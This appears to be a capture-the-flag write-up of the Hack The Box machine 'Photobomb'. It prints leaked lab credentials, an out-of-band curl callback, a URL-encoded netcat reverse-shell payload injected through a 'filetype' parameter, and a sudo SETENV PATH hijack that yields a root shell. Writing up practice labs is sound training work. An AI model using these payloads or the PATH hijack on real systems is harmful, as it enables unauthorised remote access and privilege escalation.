---
layout: post
title: "HTB: Photobomb"
subtitle: "leaked tech-support Basic auth into command injection on the printer endpoint, then a sudo SETENV PATH hijack to root"
date: 2023-02-02
tags: [htb, linux, command-injection, sudo, privesc]
category: writeups
kind: machine
tldr: "A JS file pre-filled tech-support creds when a specific cookie was set, giving Basic auth to /printer. The filetype POST param had OS command injection for a shell as wizard. Root came from a sudo SETENV rule that let me prepend /tmp to PATH and hijack find and cd called by /opt/cleanup.sh."
---

## the box

Photobomb is a Linux box serving a small image app on nginx port 80, plus SSH. The site is a Sinatra app for downloading stock photos in different formats and sizes.

## recon

Browsing `photobomb.htb`, the homepage source loaded a JS file with a telling function.

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

If the cookie `isPhotoBombTechSupport` is present, the page rewrites a link to include `pH0t0:b0Mb!` as Basic auth credentials for `/printer`. I set `isPhotoBombTechSupport=test` with a cookie manager extension, reloaded, and reached the printer page.

## foothold

The printer endpoint takes a `photo`, a `filetype`, and `dimensions`. The injection is blind, the app returns no command output, so I narrowed the parameter by timing. Injecting into `photo` or `dimensions` returned a 500 immediately, but `filetype` hung for several seconds when I appended a `sleep`, which meant my command was actually running there. The other two are validated against allowed values; `filetype` is concatenated straight into the shell call. I appended a command after a semicolon and confirmed it with an OOB callback to my box.

```
photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg; curl http://10.10.16.52:8000/test&dimensions=3000x2000
```

The curl fired, so I swapped it for a reverse shell payload in the `filetype` parameter.

```
photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg%3B%20rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.52%208484%20%3E%2Ftmp%2Ff&dimensions=3000x2000
```

## user

The shell came back as `wizard`, which had the user flag and an SSH key for a stable session.

## root

wizard could run a cleanup script as root, and the sudo rule kept the environment with SETENV, which let me supply my own PATH:

```
(root) SETENV: NOPASSWD: /opt/cleanup.sh
```

`/opt/cleanup.sh` uses absolute paths for most of its commands (`/bin/cat`, `/usr/bin/truncate`), but it calls `find` by bare name:

```bash
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

`SETENV` defeats sudo's `secure_path`, so I prepended a writable directory to PATH and dropped a fake `find` there that just spawns a shell:

```bash
cd /dev/shm
echo -e '#!/bin/bash\nbash' > find
chmod +x find
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

When the script reached the bare `find`, it ran my `/dev/shm/find` as root, dropping a root shell and the root flag.

## takeaway

The creds were sitting in client-side JS behind a cookie check, the printer trusted unsanitized input straight into a command, and the sudo rule kept PATH attacker-controlled. `SETENV` cancels out `secure_path`, so a grant on a script that calls even one bare command name is a PATH hijack waiting to happen.
